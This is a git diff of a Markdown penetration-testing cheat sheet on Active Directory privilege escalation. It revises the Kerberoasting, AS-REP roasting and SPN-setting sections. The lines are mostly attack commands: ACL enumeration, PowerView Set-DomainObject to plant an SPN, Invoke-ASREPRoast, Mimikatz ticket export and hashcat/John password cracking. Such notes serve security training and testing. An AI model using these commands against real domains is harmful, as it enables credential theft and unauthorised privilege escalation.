@@ -1,6 +1,7 @@
 # Domain Privilege escalation
 * [Kerberoast](#Kerberoast) 
-* [AS-REPS Roasting](#AS-REPS-Roasting) 
+  * [Set SPN](#Set-SPN)
+* [AS-REP Roasting](#AS-REPS-Roasting) 
 * [Set SPN](#Set-SPN) 
 * [Unconstrained Delegation](#Unconstrained-delegation) 
 * [Constrained Delegation](#Constrained-delegation) 
@@ -63,12 +64,28 @@ python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student1@MSSQLSvc~
 ```
 
 ```
-.\hashcat.exe -m 18200 -a 0 <HASH FILE> <WORDLIST>
+.\hashcat.exe -m 13100 -a 0 <HASH FILE> <WORDLIST>
 ```
 
 ```
 .\John.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt hashes.txt
 ```
+
+### Set SPN
+- If we have sufficient permissions (GenericAll/GenericWrite). It is possible to set a SPN and then kerberoast!
+#### Enumerate permissions for group on ACL
+```
+Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”}
+Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
+```
+
+#### Set SPN for the user
+```
+. ./PowerView_dev.ps1
+Set-DomainObject -Identity <username> -Set @{serviceprincipalname=’ops/whatever1’}
+```
+
+#### Then Kerberoast user
 
 ## AS-REPS Roasting
 #### Enumerating accounts with kerberos preauth disabled
@@ -103,53 +120,6 @@ Get-ASREPHash -Username <username> -Verbose
 ```
 Invoke-ASREPRoast -Verbose
 Invoke-ASREPRoast -Verbose | fl
-```
-
-#### Crack the hash with hashcat
-Edit the hash by inserting '23' after the $krb5asrep$, so $krb5asrep$23$.......
-```
-Hashcat -a 0 -m 18200 hash.txt rockyou.txt
-```
-
-## Set SPN
-#### Enumerate permissions for group on ACL
-```
-Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”}
-Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
-```
-
-#### Check if user has SPN
-```
-. ./Powerview_dev.ps1
-Get-DomainUser -Identity <username> | select samaccountname, serviceprincipalname
-```
-
-of
-
-```
-Get-NetUser | Where-Object {$_.servicePrincipalName}
-```
-
-#### Set SPN for the user
-```
-. ./PowerView_dev.ps1
-Set-DomainObject -Identity <username> -Set @{serviceprincipalname=’ops/whatever1’}
-```
-
-#### Request a TGS
-```
-Add-Type -AssemblyName System.IdentityModel 
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever1"
-```
-
-#### Export ticket to disk for offline cracking
-```
-Invoke-Mimikatz -Command '"Kerberos::list /export"'
-```
-
-#### Request TGS hash for offline cracking hashcat
-```
-Get-DomainUser -Identity <username> | Get-DomainSPNTicket | select -ExpandProperty Hash
 ```
 
 #### Crack the hash with hashcat
